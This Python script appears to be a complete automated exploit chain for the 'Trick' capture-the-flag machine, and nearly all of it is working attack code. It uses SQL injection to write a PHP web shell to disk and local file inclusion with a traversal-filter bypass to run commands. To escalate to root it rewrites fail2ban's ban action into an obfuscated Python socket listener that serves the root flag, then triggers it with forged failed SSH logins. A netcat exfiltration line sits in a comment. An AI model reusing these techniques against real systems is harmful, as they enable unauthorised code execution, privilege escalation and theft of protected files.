#!/usr/bin/env python
import logging
import sys
import requests
import re
import socket
import fcntl
import struct
import time

logger = logging.getLogger(__name__)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)


class CustomFormatter(logging.Formatter):
    """Formatter class to generate colourful log message"""
    grey = "\x1b[38;20m"
    blue = '\x1b[38;5;39m'
    yellow = "\x1b[33;20m"
    red = "\x1b[31;20m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"
    FORMAT = "[%(filename)s:%(lineno)s - %(funcName)20s() ] %(message)s"
    # FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s (%(filename)s:%(lineno)d)"

    FORMATS = {
        logging.DEBUG: blue + FORMAT + reset,
        logging.INFO: grey + FORMAT + reset,
        logging.WARNING: yellow + FORMAT + reset,
        logging.ERROR: red + FORMAT + reset,
        logging.CRITICAL: bold_red + FORMAT + reset
    }

    def format(self, record):
        """

        Args:
          record (dict): attribute dictionary for string formatting operation

        Returns:
            str: The formatted string

        """
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)


ch.setFormatter(CustomFormatter())
logger.addHandler(ch)


def sql_injection_str2file(test=False):
    """ Using the SQL injection in the manage_employeed.php endpoint to write a simple PHP shell to `/tmp/phpcmd.php`.

    Args:
      test:  (Default value = False) wether to test the injection only

    Returns:
        None
    """
    logger.debug("Starting SQL injection")
    endpoint = "http://preprod-payroll.trick.htb/manage_employee.php?id=-1"
    injectionstr = "UNION ALL SELECT NULL,NULL,NULL,NULL,{},NULL,NULL,NULL"
    with requests.Session() as s:
        if test:
            logger.debug("Testing SQL injection")
            injection = injectionstr.format('0x3a3a666f6f6261723a3a')
            req = s.get(f"{endpoint} {injection}")
            if ((content := req.text).find("::foobar::") == -1):
                logger.critical("SQL injection failed")
                logger.critical(content)
                if "502 Bad Gateway" in content:
                    logger.critical("You should reset the machine, maybe the PHP process isn't working anymore")
                sys.exit(1)
            logger.debug("SQL injection success")
            return None
        injection = injectionstr.format("CONCAT(0x3a5e5e3a,LOAD_FILE('/tmp/phpcmd.php'),0x3a5e5e3a)")
        req = s.get(f"{endpoint} {injection}")
        content = req.text
        filecontent = re.findall(
                r"""<input type="text" name="lastname" required="required" class="form-control" value=":\^\^:(.*?):\^\^:" />""", content, re.M | re.S
        )
        # Inject only if the PHP shell isn't already present
        if """<?php system($_GET['cmd']); ?>""" in filecontent[:1]:
            logger.debug("PHP Shell already present")
        else:
            injection = "UNION ALL SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e0a,0x0a,0x0a,0x0a,0x0a,0x0a,0x0a,0x0a " \
                "INTO DUMPFILE '/tmp/phpcmd.php'-- -"
            req = s.get(f"{endpoint} {injection}")


def lfi_rce_payroll():
    """Using the injected and written PHP shell `tmp/phpcmd.php` to execute commands, extracting the output from the web page.
    The used endpoint belongs to `preprod-payroll.trick.htb/index.php?page=`.
    """
    # The vulnerable PHP code below
    # <?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
    # <?php include $page.'.php' ?>
    logger.debug("Starting Payroll LFI/RCE")
    cmd = "cat /var/www/market/index.php"
    TESTCMD = "echo ]foobar["
    endpoint = "http://preprod-payroll.trick.htb/index.php?page=/tmp/phpcmd&cmd={}"
    with requests.Session() as s:
        req = s.get(endpoint.format(TESTCMD), allow_redirects=False)
        content = req.text
        cmdout = re.findall(r'<main id="view-panel" >(.*)</main>', content, re.M | re.S)[0].strip()
        if "]foobar[" in cmdout:
            logger.debug("PHP Shell working, we have RCE")
            req = s.get(endpoint.format(cmd), allow_redirects=False)
            content = req.text
            cmdout = re.findall(r'<main id="view-panel" >(.*)</main>', content, re.M | re.S)[0].strip()
            logger.debug(cmdout)
        else:
            logger.critical("Payroll RCE failed")
            sys.exit(1)


def lfi_rce_marketing(cmd="", test=False):
    """Using the injected and written PHP shell `/tmp/phpcmd.php` in the `marketing` vhost to execute commands and extract the
    output from the web page.
    The commands are executed as local user `michael`

    Args:
      cmd (str):  (Default value = "") The cmd to execute
      test (bool):  (Default value = False) If true, validate if RCE works

    Returns:
        str: the output of the executed cmd
    """
    # The vulnerable PHP code below
    # $file = $_GET['page'];
    # include("/var/www/market/".str_replace("../","",$file));
    if test:
        logger.debug("Testing Marketing LFI/RCE")
    TESTCMD = "echo ]foobar["
    endpoint = "http://preprod-payroll.trick.htb/index.php?page=....//....//....//tmp/phpcmd.php&cmd={}"
    # Setting the Host header to reach the `marketing` vhost
    # We could also set the DNS record of `preprod-marketing.trick.htb` to the targets IP
    headers = {
        "Host": "preprod-marketing.trick.htb"
    }
    with requests.Session() as s:
        if test:
            req = s.get(endpoint.format(TESTCMD), allow_redirects=False, headers=headers)
            content = req.text
            # logger.debug(content)
            cmdout = content.strip()
            if "]foobar[" not in cmdout:
                logger.critical(f"Marketing RCE failed, cmd was: {TESTCMD}")
                sys.exit(1)
            else:
                logger.debug("Marketing LFI/RCE success")
        logger.debug(cmd)
        req = s.get(endpoint.format(cmd), allow_redirects=False, headers=headers)
        content = req.text
        cmdout = content.strip()
        return cmdout


def user_flag():
    """Extract the user flag using various exploitation techniques.
    The LFI in the marketing endpoint is executed as user michael, allowing us to read the `user.txt` file in the home directory.
    Returns:
        str: the user flag
    """
    sql_injection_str2file()
    user_flag = lfi_rce_marketing("cat /home/michael/user.txt")
    return user_flag


def root_flag(lip, tip):
    """Extract the users flag using various exploitation techniques.
    User michael is abel to use sudo to restart fail2ban, shown by `sudo -l`. The user is part of the security group that can create and delete
    files in `/etc/fail2ban/action.d/`, but don't change.
    By copying and altering the ban command in `iptables-multiport.conf`, a python script is executed that reads the root flag and outputs the
    content to the first client connecting on port 35345. After changing the ban command the file is force copied to the original location and
    fail2ban restarted using the sudo command.
    To trigger the ban command, we could connect and falsely authenticate to the SSH daemon multiple times. Instead we inject simulated failed login
    attempts in the `/var/log/auth.log` leveraging the `logger` linux command.
    After a short wait time the script connects to the hopefully running python socket and receives the root flag.

    Args:
      lip (str): The local IP (attacker machine)
      tip (str): The target IP

    Returns:
        str: the user flag

    """
    sql_injection_str2file()
    sudo_check = "(root) NOPASSWD: /etc/init.d/fail2ban restart"
    if sudo_check not in lfi_rce_marketing("sudo -l"):
        logger.critical("fail2ban restart not executable with sudo")
        sys.exit(1)
    if not lfi_rce_marketing("which python3"):
        logger.critical("python3 not available")
        sys.exit(1)
    lfi_rce_marketing("cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/im.conf.tmp")
    cmd = "".join([
        r"""sed -i "s/<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/""",
        r"""python3 \-c 'exec\(\"\\\nimport socket\\\n""",
        r"""d\=lambda istr\: bytes\.fromhex\(hex\(istr\)\[2\:\]\)\.decode\(\)\\\n""",
        r"""s\=socket\.socket\(socket\.AF_INET,socket\.SOCK_STREAM\)\\\n""",
        r"""s\.setsockopt\(socket\.SOL_SOCKET, socket\.SO_REUSEADDR, 1\)\\\n""",
        r"""s\.bind\(\(d\(13561583350328880\),35345\)\)\\\ns\.listen\(5\)\\\nc,a\=s\.accept\(\)\\\n""",
        r"""c\.sendall\(open\(d\(962339749473780545853982382520436\), d\(29282\)\)\.read\(\)\)\\\n""",
        r"""\"\)'/g" /tmp/im.conf.tmp""",
    ])
    logger.debug(cmd)
    lfi_rce_marketing(cmd)
    lfi_rce_marketing("""cp -f /tmp/im.conf.tmp /etc/fail2ban/action.d/iptables-multiport.conf""")
    lfi_rce_marketing("""sudo /etc/init.d/fail2ban restart""")
    time.sleep(10)
    # ALTERNATIV: cat /root/root.txt | nc -Nlvp 4444
    # client: nc -d 127.0.0.1 4444
    logger_chain = 'logger --tag sshd --id=1337 -p auth.info "Failed password for invalid user root from 192.192.192.192 port 31337 ssh2";sleep 2;' * 12
    lfi_rce_marketing(logger_chain)
    # for i in range(15):
    #     lfi_rce_marketing(f"""logger --tag sshd --id={1337+i} -p auth.info 'Failed password for invalid user root from 192.192.192.192 port {31337+i} ssh2'""")
    #     time.sleep(1)
    time.sleep(5)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((tip, 35345))
        data = s.recv(1024)
    root_flag = data.strip().decode()
    return root_flag


def get_ip_address(ifname):
    """

    Args:
      ifname (str): Name of the network interface

    Returns:
        str: The IP of the given network interface
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', bytes(ifname[:15], 'utf-8'))
    )[20:24])


def main():
    """The main function to start the PoC"""
    # Enable DEBUG logging if you want see the executed steps
    # logger.setLevel(logging.DEBUG)
    logger.setLevel(logging.INFO)
    logger.info("Initializing PoC")
    logger.info("Getting the root flag takes around 30 seconds, be patient")
    sql_injection_str2file(test=True)
    sql_injection_str2file()
    lfi_rce_marketing(test=True)
    lip = get_ip_address("tun0")
    logger.info("user flag: {}".format(user_flag()))
    logger.info("root flag: {}".format(root_flag(lip, "preprod-payroll.trick.htb")))


if __name__ == "__main__":
    main()

